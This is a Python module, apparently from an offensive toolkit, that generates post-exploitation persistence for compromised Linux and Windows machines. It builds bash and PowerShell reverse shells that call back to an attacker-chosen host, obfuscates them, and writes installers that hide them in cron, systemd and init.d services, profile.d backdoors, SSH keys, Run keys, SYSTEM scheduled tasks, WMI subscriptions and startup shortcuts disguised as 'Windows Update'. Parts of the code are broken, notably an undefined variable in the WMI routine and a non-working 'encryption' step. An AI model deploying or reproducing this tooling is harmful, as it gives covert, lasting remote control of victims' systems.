"""
Session Persistence Module
Automatically establishes persistence on compromised systems
Integrates with CrackSession for post-exploitation persistence
"""

import base64
import os
import subprocess
import tempfile
import uuid
import time
from datetime import datetime, timedelta
from enum import Enum

from cyberapp.models.db import db_conn
from cybermodules.helpers import log_to_intel


class OSType(Enum):
    """Target operating system types"""
    LINUX = "linux"
    WINDOWS = "windows"
    MACOS = "macos"
    UNKNOWN = "unknown"


class PersistenceMethod(Enum):
    """Persistence methods by OS"""
    # Linux methods
    CRON = "cron"
    SSH_KEY = "ssh_key"
    SYSTEMD = "systemd"
    INIT_D = "init_d"
    PROFILE_BACKDOOR = "profile_backdoor"
    RC_LOCAL = "rc_local"
    PKG_BACKDOOR = "pkg_backdoor"
    
    # Windows methods
    WINDOWS_SERVICE = "windows_service"
    REGISTRY_RUN = "registry_run"
    REGISTRY_RUNONCE = "registry_runonce"
    SCHEDULED_TASK = "scheduled_task"
    WMI_SUBSCRIPTION = "wmi_subscription"
    STARTUP_FOLDER = "startup_folder"
    DLL_HIJACKING = "dll_hijacking"
    SERVICE_DLL = "service_dll"


class PersistenceEngine:
    """
    Session persistence engine
    Automatically establishes persistence after session acquisition
    """
    
    def __init__(self, scan_id, session_info=None):
        self.scan_id = scan_id
        self.session_info = session_info or {}
        self.target = session_info.get("target", "unknown")
        self.os_type = OSType.UNKNOWN
        self.installed_persistence = []
        self.rev_shell_ip = session_info.get("lhost", "")
        self.rev_shell_port = session_info.get("lport", 4444)
        self.payload_path = session_info.get("payload_path", "/tmp/.systemd")
        self.technique = "reverse_shell"
        
        # Payload settings
        self.payload_type = session_info.get("payload_type", "bash")
        self.encryption = session_info.get("encryption", False)
        self.obfuscation = session_info.get("obfuscation", False)
    
    def log(self, msg_type, message):
        """Log to intel table"""
        log_to_intel(self.scan_id, f"PERSISTENCE_{msg_type}", message)
        print(f"[PERSISTENCE][{msg_type}] {message}")
    
    def detect_os(self):
        """Detect target operating system"""
        if self.session_info.get("os"):
            os_str = self.session_info["os"].lower()
            if "windows" in os_str:
                self.os_type = OSType.WINDOWS
            elif "linux" in os_str or "unix" in os_str:
                self.os_type = OSType.LINUX
            elif "darwin" in os_str or "mac" in os_str:
                self.os_type = OSType.MACOS
        else:
            self.os_type = OSType.LINUX
        
        self.log("OS_DETECTED", f"Target OS: {self.os_type.value}")
        return self.os_type
    
    def set_connection_info(self, lhost, lport):
        """Set reverse shell connection info"""
        self.rev_shell_ip = lhost
        self.rev_shell_port = lport
        self.log("CONFIG", f"Connection: {lhost}:{lport}")
    
    def generate_reverse_shell(self, os_type=None):
        """
        Generate persistence reverse shell payload
        Supports multiple encoding and encryption options
        """
        if os_type is None:
            os_type = self.os_type
        
        if os_type == OSType.WINDOWS:
            return self._generate_windows_payload()
        else:
            return self._generate_linux_payload()
    
    def _generate_linux_payload(self):
        """Generate Linux reverse shell payload"""
        shell_cmd = f"/bin/bash -i >& /dev/tcp/{self.rev_shell_ip}/{self.rev_shell_port} 0>&1"
        
        if self.encryption:
            key = uuid.uuid4().hex[:8]
            encoded = ''.join([chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(shell_cmd)])
            shell_cmd = f"echo '{encoded}' | base64 -d | xxd -r | bash -s {key}"
        
        if self.obfuscation:
            shell_cmd = self._obfuscate_payload(shell_cmd)
        
        return shell_cmd
    
    def _generate_windows_payload(self):
        """Generate Windows reverse shell payload (PowerShell)"""
        if self.payload_type == "powershell":
            payload = f"""$client = New-Object System.Net.Sockets.TCPClient("{self.rev_shell_ip}",{self.rev_shell_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
            encoded_payload = payload.encode('utf-16le')
            b64_payload = base64.b64encode(encoded_payload).decode().replace('\n', '')
            return f"powershell -w hidden -nop -c \"{b64_payload}\""
        return "cmd.exe /c whoami"
    
    def _obfuscate_payload(self, payload):
        """Basic payload obfuscation"""
        import base64
        encoded = base64.b64encode(payload.encode()).decode()
        return f"bash -c 'echo {encoded} | base64 -d | sh'"
    
    # ==================== LINUX PERSISTENCE METHODS ====================
    
    def install_cron_persistence(self, interval="every_minute"):
        """
        Install cron-based persistence
        Installs a cron job that calls back periodically
        """
        cron_entries = {
            "every_minute": f"* * * * * {self.payload_path}\n",
            "every_5_minutes": f"*/5 * * * * {self.payload_path}\n",
            "every_hour": f"0 * * * * {self.payload_path}\n",
            "daily": f"0 0 * * * {self.payload_path}\n",
            "reboot": f"@reboot {self.payload_path}\n",
        }
        
        entry = cron_entries.get(interval, cron_entries["every_minute"])
        
        payload_script = f"""#!/bin/bash
# Auto-generated persistence script
{self.generate_reverse_shell()}
"""
        
        self.log("CRON", f"Installing cron persistence: {interval}")
        
        result = {
            "method": "cron",
            "interval": interval,
            "cron_entry": entry.strip(),
            "payload_path": self.payload_path,
            "success": False
        }
        
        result["commands"] = [
            f"echo '# Persistence' > /tmp/.cron_persist",
            f"echo '{self.generate_reverse_shell()}' >> /tmp/.cron_persist",
            f"chmod +x /tmp/.cron_persist",
            f"(crontab -l 2>/dev/null | grep -v persistence; echo '{entry}') | crontab -",
            f"crontab -l"
        ]
        
        self.installed_persistence.append(result)
        self.log("CRON", f"Cron persistence ready: {entry.strip()}")
        
        return result
    
    def install_ssh_key_persistence(self, username="root"):
        """
        Install SSH key for persistent access
        Generates and installs authorized_keys entry
        """
        self.log("SSH_KEY", f"Installing SSH key persistence for {username}")
        
        key_type = "ed25519"
        key_comment = f"systemd-{uuid.uuid4().hex[:8]}"
        
        result = {
            "method": "ssh_key",
            "username": username,
            "key_type": key_type,
            "success": False
        }
        
        result["commands"] = [
            f"mkdir -p /root/.ssh 2>/dev/null || mkdir -p /home/{username}/.ssh 2>/dev/null",
            f"ssh-keygen -t {key_type} -f /tmp/.ssh_key -N '' -C '{key_comment}'",
            f"cat /tmp/.ssh_key.pub >> ~/.ssh/authorized_keys 2>/dev/null || cat /tmp/.ssh_key.pub >> /home/{username}/.ssh/authorized_keys",
            f"chmod 600 ~/.ssh/authorized_keys 2>/dev/null || chmod 600 /home/{username}/.ssh/authorized_keys",
            f"chmod 700 ~/.ssh 2>/dev/null || chmod 700 /home/{username}/.ssh 2>/dev/null",
            f"echo 'SSH key installed for {username}'"
        ]
        
        result["private_key_path"] = "/tmp/.ssh_key"
        result["public_key_comment"] = key_comment
        
        self.installed_persistence.append(result)
        self.log("SSH_KEY", "SSH key persistence ready")
        
        return result
    
    def install_systemd_persistence(self, service_name=None):
        """
        Install systemd service for persistence
        Creates a service that starts on boot
        """
        if not service_name:
            service_name = f"systemd-{uuid.uuid4().hex[:6]}"
        
        self.payload_path = f"/opt/{service_name}"
        
        self.log("SYSTEMD", f"Installing systemd service: {service_name}")
        
        shell_script = f"""#!/bin/bash
# Auto-generated persistence service
{self.generate_reverse_shell()}
"""
        
        service_file = f"""[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c '{self.generate_reverse_shell()}'
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
"""
        
        result = {
            "method": "systemd",
            "service_name": service_name,
            "service_file": service_file,
            "payload_path": self.payload_path,
            "success": False
        }
        
        result["commands"] = [
            f"cat > /etc/systemd/system/{service_name}.service << 'EOF'",
            service_file,
            "EOF",
            f"chmod 644 /etc/systemd/system/{service_name}.service",
            "systemctl daemon-reload",
            f"systemctl enable {service_name}.service",
            f"systemctl start {service_name}.service",
            f"systemctl status {service_name}.service"
        ]
        
        self.installed_persistence.append(result)
        self.log("SYSTEMD", f"Systemd service ready: {service_name}")
        
        return result
    
    def install_initd_persistence(self, service_name=None):
        """
        Install SysV init.d script for older Linux systems
        """
        if not service_name:
            service_name = f"init-{uuid.uuid4().hex[:6]}"
        
        self.log("INIT_D", f"Installing init.d script: {service_name}")
        
        init_script = f"""#!/bin/bash
### BEGIN INIT INFO
# Provides:          {service_name}
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System service
### END INIT INFO

case "$1" in
    start)
        {self.generate_reverse_shell()}
        ;;
    stop)
        exit 0
        ;;
    restart)
        $0 stop
        $0 start
        ;;
    *)
        echo "Usage: $0 {{start|stop|restart}}"
        exit 1
esac
"""
        
        result = {
            "method": "init_d",
            "service_name": service_name,
            "init_script": init_script,
            "success": False
        }
        
        result["commands"] = [
            f"cat > /etc/init.d/{service_name} << 'EOF'",
            init_script,
            "EOF",
            f"chmod +x /etc/init.d/{service_name}",
            f"update-rc.d {service_name} defaults",
            f"/etc/init.d/{service_name} start"
        ]
        
        self.installed_persistence.append(result)
        self.log("INIT_D", f"Init.d script ready: {service_name}")
        
        return result
    
    def install_profile_backdoor(self, profile_file=None):
        """
        Install backdoor in shell profile
        Executes payload when user logs in
        """
        if not profile_file:
            profile_file = "/etc/profile.d/system-backdoor.sh"
        
        self.log("PROFILE", f"Installing profile backdoor: {profile_file}")
        
        backdoor_code = f"""# System maintenance backdoor
if [ ! -f /tmp/.systemd_logged ]; then
    {self.generate_reverse_shell()} &
    touch /tmp/.systemd_logged
fi
"""
        
        result = {
            "method": "profile_backdoor",
            "profile_file": profile_file,
            "backdoor_code": backdoor_code,
            "success": False
        }
        
        result["commands"] = [
            f"cat > {profile_file} << 'EOF'",
            backdoor_code,
            "EOF",
            f"chmod 644 {profile_file}"
        ]
        
        self.installed_persistence.append(result)
        self.log("PROFILE", f"Profile backdoor ready: {profile_file}")
        
        return result
    
    def install_rc_local_persistence(self):
        """
        Install payload in /etc/rc.local
        Executes at boot time
        """
        self.log("RC_LOCAL", "Installing rc.local persistence")
        
        payload_script = f"""#!/bin/bash
# Persistence backdoor
{self.generate_reverse_shell()} &
exit 0
"""
        
        result = {
            "method": "rc_local",
            "payload": payload_script,
            "success": False
        }
        
        result["commands"] = [
            "if [ ! -f /etc/rc.local.bak ]; then cp /etc/rc.local /etc/rc.local.bak; fi",
            f"cat > /etc/rc.local << 'EOF'",
            payload_script,
            "EOF",
            "chmod +x /etc/rc.local"
        ]
        
        self.installed_persistence.append(result)
        self.log("RC_LOCAL", "rc.local persistence ready")
        
        return result
    
    # ==================== WINDOWS PERSISTENCE METHODS ====================
    
    def install_windows_service(self, service_name=None):
        """
        Install Windows service for persistence
        Creates a service that runs the payload
        """
        if not service_name:
            service_name = f"WinUpdate-{uuid.uuid4().hex[:4]}"
        
        self.log("WIN_SERVICE", f"Installing Windows service: {service_name}")
        
        result = {
            "method": "windows_service",
            "service_name": service_name,
            "success": False
        }
        
        payload = self.generate_reverse_shell(OSType.WINDOWS)
        
        result["commands"] = [
            f"$serviceName = '{service_name}'",
            f"$serviceDesc = 'Windows Update Service'",
            f"$payload = '{payload}'",
            "$exePath = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe'",
            f"sc.exe create $serviceName binPath= '$exePath -w hidden -nop -c \"$payload\"' DisplayName= $serviceDesc start= auto",
            f"sc.exe description $serviceName $serviceDesc",
            f"sc.exe failure $serviceName reset= 30 actions= restart/1000/restart/2000/",
            f"sc.exe config $serviceName start= auto",
            f"Invoke-ServiceControl -Name $serviceName -Control Start"
        ]
        
        result["powershell_one_liner"] = [
            f"New-Service -Name '{service_name}' -BinaryPathName 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -w hidden -nop -c \"$payload\"' -DisplayName 'Windows Update' -StartType Automatic"
        ]
        
        self.installed_persistence.append(result)
        self.log("WIN_SERVICE", f"Windows service ready: {service_name}")
        
        return result
    
    def install_registry_persistence(self, reg_path="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"):
        """
        Install registry run key persistence
        Adds payload to run key for automatic execution
        """
        self.log("REGISTRY", f"Installing registry persistence: {reg_path}")
        
        if not self.session_info.get("username"):
            value_name = f"WindowsUpdate-{uuid.uuid4().hex[:4]}"
        else:
            value_name = f"{self.session_info['username']}Update"
        
        payload = self.generate_reverse_shell(OSType.WINDOWS)
        
        result = {
            "method": "registry_run",
            "reg_path": reg_path,
            "value_name": value_name,
            "success": False
        }
        
        result["commands"] = [
            f"$regPath = '{reg_path}\\{value_name}'",
            f"$payload = '{payload}'",
            f'Set-ItemProperty -Path "$regPath" -Name "(Default)" -Value "$payload"',
            f'Get-ItemProperty -Path "{reg_path}" -Name "{value_name}"'
        ]
        
        result["reg_commands"] = [
            f'reg add "{reg_path}" /v {value_name} /d "{payload}" /f'
        ]
        
        self.installed_persistence.append(result)
        self.log("REGISTRY", f"Registry persistence ready: {value_name}")
        
        return result
    
    def install_scheduled_task(self, task_name=None):
        """
        Install scheduled task for persistence
        Task runs at logon or specified intervals
        """
        if not task_name:
            task_name = f"WindowsUpdater-{uuid.uuid4().hex[:4]}"
        
        self.log("SCHEDULED_TASK", f"Installing scheduled task: {task_name}")
        
        payload = self.generate_reverse_shell(OSType.WINDOWS)
        trigger_time = datetime.now() + timedelta(minutes=1)
        trigger_str = trigger_time.strftime("%Y-%m-%dT%H:%M:%S")
        
        result = {
            "method": "scheduled_task",
            "task_name": task_name,
            "trigger": "At logon",
            "success": False
        }
        
        result["commands"] = [
            f"$taskName = '{task_name}'",
            f"$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden -nop -c \"{payload}\"'",
            '$trigger = New-ScheduledTaskTrigger -AtLogon -User "NT AUTHORITY\\SYSTEM"',
            '$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunSilent',
            f'Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest',
            f'Start-ScheduledTask -TaskName $taskName'
        ]
        
        result["schtasks_commands"] = [
            f'schtasks /create /tn "{task_name}" /tr "powershell -w hidden -nop -c \"{payload}\"" /sc onlogon /ru "SYSTEM"',
            f'schtasks /run /tn "{task_name}"'
        ]
        
        self.installed_persistence.append(result)
        self.log("SCHEDULED_TASK", f"Scheduled task ready: {task_name}")
        
        return result
    
    def install_wmi_subscription(self):
        """
        Install WMI event subscription persistence
        Uses MSFT_SuspiciousEventConsumer for persistent execution
        """
        self.log("WMI", "Installing WMI subscription persistence")
        
        payload = self.generate_reverse_shell(OSType.WINDOWS)
        consumer_name = f"Updater-{uuid.uuid4().hex[:4]}"
        
        result = {
            "method": "wmi_subscription",
            "consumer_name": consumer_name,
            "success": False
        }
        
        # WQL query with properly escaped single quotes
        wql_query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240"
        
        result["commands"] = [
            f"$consumerName = '{consumer_name}'",
            f"$payload = '{payload}'",
            f'$consumer = Set-WmiInstance -Namespace "root\\subscription" -Class CommandLineEventConsumer -Arguments @{{Name = $consumerName; CommandLineTemplate = "powershell -w hidden -nop -c \\"$payload\\""}}',
            f'$filter = Set-WmiInstance -Namespace "root\\subscription" -Class __EventFilter -Arguments @{{Name = "{consumerName}Filter"; EventNamespace = "root\\subscription"; QueryLanguage = "WQL"; Query = "{wql_query}"}}',
            f'Set-WmiInstance -Namespace "root\\subscription" -Class __FilterToConsumerBinding -Arguments @{{Filter = $filter; Consumer = $consumer}}'
        ]
        
        self.installed_persistence.append(result)
        self.log("WMI", f"WMI subscription ready: {consumer_name}")
        
        return result
    
    def install_startup_folder_persistence(self):
        """
        Install LNK file in startup folder
        Executes when user logs in
        """
        self.log("STARTUP", "Installing startup folder persistence")
        
        payload = self.generate_reverse_shell(OSType.WINDOWS)
        link_name = "Windows Update.lnk"
        
        result = {
            "method": "startup_folder",
            "link_name": link_name,
            "success": False
        }
        
        result["commands"] = [
            f'''$wscript = @"
Set oWS = WScript.CreateObject("WScript.Shell")
sLink = oWS.SpecialFolders("Startup") & "\\{link_name}"
Set oLink = oWS.CreateShortCut(sLink)
oLink.TargetPath = "powershell.exe"
oLink.Arguments = "-w hidden -nop -c \\"{payload}\\""
oLink.WindowStyle = 0
oLink.Save
"@''',
            '$wscript | Out-File -FilePath "C:\\Windows\\Temp\\create_lnk.vbs" -Encoding ASCII',
            'cscript C:\\Windows\\Temp\\create_lnk.vbs',
            'Remove-Item -Path "C:\\Windows\\Temp\\create_lnk.vbs"'
        ]
        
        self.installed_persistence.append(result)
        self.log("STARTUP", f"Startup folder persistence ready: {link_name}")
        
        return result
    
    # ==================== AUTO INSTALL ====================
    
    def install_all(self, methods=None):
        """
        Install all or specified persistence methods
        Automatically selects methods based on OS
        """
        self.detect_os()
        
        if not methods:
            if self.os_type == OSType.LINUX:
                methods = ["cron", "ssh_key", "systemd"]
            elif self.os_type == OSType.WINDOWS:
                methods = ["registry", "scheduled_task", "service"]
            else:
                methods = ["cron", "registry"]
        
        results = []
        
        for method in methods:
            result = None
            
            if self.os_type == OSType.LINUX:
                method_map = {
                    "cron": self.install_cron_persistence,
                    "ssh_key": self.install_ssh_key_persistence,
                    "systemd": self.install_systemd_persistence,
                    "init_d": self.install_initd_persistence,
                    "profile": self.install_profile_backdoor,
                    "rc_local": self.install_rc_local_persistence,
                }
            elif self.os_type == OSType.WINDOWS:
                method_map = {
                    "service": self.install_windows_service,
                    "registry": self.install_registry_persistence,
                    "scheduled_task": self.install_scheduled_task,
                    "wmi": self.install_wmi_subscription,
                    "startup": self.install_startup_folder_persistence,
                }
            else:
                method_map = {}
            
            if method in method_map:
                try:
                    result = method_map[method]()
                    results.append(result)
                except Exception as e:
                    self.log("ERROR", f"Failed to install {method}: {str(e)}")
        
        return results
    
    def get_commands(self):
        """
        Get all commands to execute on target
        Returns consolidated command list
        """
        all_commands = []
        
        for persistence in self.installed_persistence:
            if "commands" in persistence:
                all_commands.extend(persistence["commands"])
        
        return all_commands
    
    def generate_report(self):
        """
        Generate persistence installation report
        """
        report = f"""
=== PERSISTENCE INSTALLATION REPORT ===
Generated: {datetime.now().isoformat()}
Target: {self.target}
OS: {self.os_type.value}
Methods Installed: {len(self.installed_persistence)}

Installed Persistence Methods:
"""
        
        for i, p in enumerate(self.installed_persistence, 1):
            report += f"\n{i}. {p['method'].upper()}"
            if 'service_name' in p:
                report += f" - {p['service_name']}"
            if 'value_name' in p:
                report += f" - {p['value_name']}"
        
        report += "\n" + "=" * 40
        
        self.log("REPORT", report)
        
        return report
    
    def cleanup(self):
        """
        Remove all installed persistence (for OPSEC)
        """
        self.log("CLEANUP", "Starting persistence cleanup")
        
        cleanup_commands = []
        
        for p in self.installed_persistence:
            method = p.get("method")
            
            if method == "cron":
                cleanup_commands.append("crontab -r")
            elif method == "systemd":
                svc = p.get("service_name")
                cleanup_commands.extend([
                    f"systemctl stop {svc}.service",
                    f"systemctl disable {svc}.service",
                    f"rm /etc/systemd/system/{svc}.service",
                    "systemctl daemon-reload"
                ])
            elif method == "registry":
                path = p.get("reg_path")
                name = p.get("value_name")
                cleanup_commands.append(f'reg delete "{path}" /v {name} /f')
            elif method == "scheduled_task":
                task = p.get("task_name")
                cleanup_commands.append(f'schtasks /delete /tn "{task}" /f')
        
        return cleanup_commands
